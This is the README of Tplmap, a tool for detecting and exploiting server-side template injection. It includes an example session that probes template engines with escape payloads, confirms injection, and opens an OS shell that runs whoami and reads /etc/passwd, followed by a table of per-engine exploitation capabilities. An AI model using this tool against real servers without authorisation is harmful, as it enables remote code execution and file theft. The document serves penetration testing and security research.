Tplmap
======

Tplmap (short for _Template Mapper_) is a tool that automate the process of detecting and exploiting Server-Side Template Injection vulnerabilities (SSTI).

This can be used by developers, penetration testers, and security researchers to detect and exploit vulnerabilities related to the template injection attacks.

The technique can be used to compromise web servers' internals and often obtain Remote Code Execution (RCE), turning every vulnerable application into a potential pivot point.

The modular approach allows any contributor to extend the support to other templating engines or introduce new exploitation techniques. The majority of the techniques currently implemented came from the amazing research done by [James Kett, PortSwigger][1].

> The application is currently under heavy development and misses some functionalities.

Example
--------

```
$ ./tplmap.py -u 'http://www.target.com/app?id=*' 
[[+] Tplmap 0.1b
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Found placeholder in GET parameter 'id'
[+] Smarty plugin is testing reflection on text context with tag {*}
[+] Smarty plugin is testing }*{ code context escape with 6 mutations
[+] Mako plugin is testing reflection on text context with tag ${*}
[+] Mako plugin is testing %>*<%# code context escape with 6 mutations
[+] Jinja2 plugin is testing reflection on text context with tag {{*}}
[+] Jinja2 plugin is testing %}* code context escape with 6 mutations
[+] Twig plugin is testing reflection on text context with tag {{*}}
[+] Twig plugin is testing }}*{{1 code context escape with 6 mutations
[+] Freemarker plugin is testing reflection on text context with tag ${*}
[+] Freemarker plugin is testing }* code context escape with 6 mutations
[+] Velocity plugin is testing reflection on text context with tag #set($p=*)\n${p}\n
[+] Velocity plugin is testing )* code context escape with 6 mutations
[+] Jade plugin is testing reflection on text context with tag \n= *\n
[+] Jade plugin has confirmed injection with tag '\n= *\n'
[+] Tplmap identified the following injection point:

  Engine: Jade
  Template: \n= *\n
  Context: text
  OS: darwin
  Capabilities:
    Code evaluation: yes, javascript code
    OS command execution: yes
    File write: yes
    File read: yes

[+] Rerun tplmap providing one of the following options:
    --os-cmd or --os-shell to access the underlying operating system
    --upload LOCAL REMOTE to upload files to the server
    --download REMOTE LOCAL to download remote files
    
$ ./tplmap.py -u 'http://www.target.com/app?id=*' --os-shell
[+] Run commands on the operating system.
linux $ whoami
www-data
linux $ ls -al /etc/passwd
-rw-r--r--  1 root  wheel  5925 16 Sep  2015 /etc/passwd
linux $

```

Supported template engines
--------------------------

| Template engine    | Detection | command execution | Code evaluation | File read | File write |
|--------------------|-----------|-------------------|-----------------|-----------|------------|
| Mako               |  yes      | yes               | python          | yes       | yes        |
| Jinja2             |  yes      | yes               | python          | yes       | yes        |
| Jade               |  yes      | yes               | javascript      | yes       | yes        |
| Smarty (unsecured) |  yes      | yes               | PHP             | yes       | yes        |
| Freemarker         |  yes      | yes               | no              | yes       | yes        |
| Velocity           |  yes      | no                | no              | no        | no         |
| Twig               |  yes      | no                | no              | no        | no         |
| Smarty (secured)   |  yes      | no                | no              | no        | no         |


[1]: http://blog.portswigger.net/2015/08/server-side-template-injection.html
